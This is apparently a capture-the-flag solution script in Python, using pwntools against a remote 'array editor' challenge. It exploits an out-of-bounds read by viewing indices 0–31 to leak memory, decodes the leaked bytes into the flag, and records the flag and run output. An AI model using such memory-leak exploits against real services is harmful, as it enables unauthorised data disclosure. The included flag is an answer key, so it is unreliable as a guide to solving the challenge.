from pwn import *

#context.log_level = "debug"

#io = process("./vuln")

io = remote("eth007.me", 42044)

'''
Welcome to the array editor!
	[1] View element
	[2] Set element
> 1
idx: 1
(nil)
> 2
idx: 2
value: 2
'''

for n in range(0,32):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"idx: ", str(n).encode())
    if b"nil" not in (ans := (io.recvline())):
        ans = p64(int(ans, 16))
        try:
            print(ans.decode().strip())
            if b"}\n" in ans:
                exit(0)
        except Exception as e:
            ERROR = f"Error type: {type(e).__name__} while parsing '{ans}'"
            #print(ERROR)
#ictf{oob_means_danger_2fb9184a}
'''
$ python3 exploit.py
[+] Opening connection to eth007.me on port 42044: Done
\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00
ictf{oob
_means_d
anger_2f
b9184a}
[*] Closed connection to eth007.me port 42044
'''